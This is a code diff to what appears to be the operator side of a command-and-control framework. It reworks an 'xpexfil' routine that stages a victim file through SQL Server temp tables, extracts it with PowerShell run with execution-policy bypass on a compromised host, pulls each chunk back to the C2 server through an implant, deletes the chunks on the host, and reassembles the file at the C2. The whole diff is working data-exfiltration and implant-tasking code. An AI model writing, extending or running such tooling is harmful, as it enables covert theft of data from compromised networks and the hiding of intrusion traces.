@@ -343,8 +343,8 @@ class XpMssql:
         import base64 as _b64
         import time
         key_b64     = _b64.b64encode(os.urandom(32)).decode()
-        local_tmp   = f"C:\\Windows\\Temp\\{local_name}"
         chunk_bytes = chunk_mb * 1024 * 1024
+        upload_dir  = os.path.join(os.path.dirname(os.path.abspath(__file__)), "files")
 
         # A — get file size so we know how many chunks to expect
         print("[*] xpexfil: getting file size ...")
@@ -365,12 +365,10 @@ class XpMssql:
         num_chunks = math.ceil(file_size / chunk_bytes)
         print(f"[*] xpexfil: {file_size} bytes → {num_chunks} chunk(s) of {chunk_mb} MB each")
 
-        chunk_locals = []
         for i in range(num_chunks):
             offset = i * chunk_bytes
             length = min(chunk_bytes, file_size - offset)
             chunk_local = f"C:\\Windows\\Temp\\{local_name}.chunk{i}"
-            chunk_locals.append(chunk_local)
 
             # B — INSERT chunk
             print(f"[*] xpexfil: chunk {i+1}/{num_chunks} — INSERT (offset={offset}, len={length}) ...")
@@ -395,10 +393,14 @@ class XpMssql:
                 print(f"[!] xpexfil: timed out waiting for chunk {i} INSERT — aborting")
                 return
 
-            # D — extract chunk to WS01
+            # D — extract chunk to WS01, pull to C2, delete from WS01
             print(f"[*] xpexfil: chunk {i+1}/{num_chunks} — extracting to WS01 ...")
             extract_ps = self._build_exfil_extract_ps(chunk_local, key_b64)
             shell.cmd_exec_raw(f'powershell -NoProfile -ExecutionPolicy Bypass -Command "{extract_ps}"')
+
+            print(f"[*] xpexfil: chunk {i+1}/{num_chunks} — pulling to C2 ...")
+            shell.cmd_get_wait(chunk_local, dest_name=f"{local_name}.chunk{i}")
+            shell.cmd_exec_raw(f"cmd /c del /f {chunk_local}")
 
             # E — drop table so next chunk starts fresh
             self._exec_q(shell,
@@ -406,19 +408,20 @@ class XpMssql:
                 "IF OBJECT_ID('tempdb..exfil','U') IS NOT NULL DROP TABLE tempdb..exfil;"
             )
 
-        # F — assemble chunks on WS01, then single pull
-        if num_chunks == 1:
-            shell.cmd_exec_raw(f"cmd /c move /y {chunk_locals[0]} {local_tmp}")
-        else:
-            print(f"[*] xpexfil: assembling {num_chunks} chunks on WS01 ...")
-            parts = "+".join(chunk_locals)
-            shell.cmd_exec_raw(f"cmd /c copy /b {parts} {local_tmp}")
-            shell.cmd_exec_raw("cmd /c del /f " + " ".join(chunk_locals))
-
-        print(f"[*] xpexfil: pulling {local_name} from WS01 ...")
-        shell.cmd_get_wait(local_tmp)
-        shell.cmd_exec_raw(f"cmd /c del /f {local_tmp}")
-        print(f"[+] xpexfil done → {local_name}")
+        # F — assemble chunks on C2
+        print(f"[*] xpexfil: assembling {num_chunks} chunk(s) on C2 ...")
+        out_path = os.path.join(upload_dir, local_name)
+        with open(out_path, 'wb') as out_f:
+            for i in range(num_chunks):
+                cp = os.path.join(upload_dir, f"{local_name}.chunk{i}")
+                with open(cp, 'rb') as cf:
+                    while True:
+                        buf = cf.read(1 << 20)
+                        if not buf:
+                            break
+                        out_f.write(buf)
+                os.remove(cp)
+        print(f"[+] xpexfil done → {out_path}")
 
 
 class ToneShellShell:
@@ -542,12 +545,14 @@ class ToneShellShell:
         info     = self._post_task(task)
         print(f"[*] file-get task {info[TASK_GUID_KEY]} queued (implant will push {remote_path})")
 
-    def cmd_get_wait(self, remote_path: str):
+    def cmd_get_wait(self, remote_path: str, dest_name: str = None):
         """Pull a file FROM the implant to the C2 server upload dir, block until complete."""
         if self.debug:
-            print(f"[DBG] GET-W → implant:{remote_path} → C2 uploads/  (blocking)")
+            print(f"[DBG] GET-W → implant:{remote_path} → C2 files/{dest_name or '(random)'}  (blocking)")
         task_num = self._next_task_num()
         task     = {"id": TS_FILE_UPLOAD, "taskNum": task_num, "args": remote_path}
+        if dest_name:
+            task["fileName"] = dest_name
         info     = self._post_task(task)
         print(f"[*] file-get task {info[TASK_GUID_KEY]} queued, waiting for upload …")
         self._poll_output(info[TASK_GUID_KEY], timeout_s=180)
